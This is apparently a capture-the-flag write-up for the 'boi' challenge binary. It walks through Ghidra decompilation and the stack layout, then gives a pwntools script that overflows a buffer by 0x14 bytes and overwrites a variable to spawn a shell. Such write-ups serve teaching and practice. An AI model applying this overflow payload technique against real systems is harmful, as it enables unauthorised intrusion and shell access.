We're finally starting to exploit some buffers :D

Opening the binary up in Ghidra we can look at the `main` function and see that the program expects some input, and then compares some variable that we apparently have no control over to another variable, and if they match, we spawn a shell. Otherwise, we'd just run the `date` command.


```
undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  undefined8 input;
  undefined8 local_30;
  undefined4 uStack_28;
  uint variableToChange;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  local_30 = 0;
  uStack_28 = 0;
  variableToChange = 0xdeadbeef;
  puts("Are you a big boiiiii??");
  read(0,&input,0x18);
  if (variableToChange == 0xcaf3baee) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

But if we analyze the code further, we can see that we're reading `0x18` bytes (or 24 bytes, in decimal) into a variable that only has 8 bytes. And if we see how the variables sit on the stack, we can see that the variables are all one after another.

```
 undefined8        Stack[-0x10]:8 local_10                                
 undefined4        Stack[-0x20]:4 local_20                                
 uint              Stack[-0x24]:4 variableToChange                        
 undefined8        Stack[-0x30]:8 local_30                                
 undefined8        Stack[-0x38]:8 input                                   
```

So if we do some math: `0x38 - 0x24 = 0x14`, which is smaller than `0x18` so, we can just send `0x14` dud bytes, and then the desired value, and BOOM! Shell popped :)

Script that solves this for us

```
from pwn import *

boi = process('./boi')

payload = b"0"* 0x14 +  p32(0xcaf3baee)

boi.send(payload)
boi.interactive()
```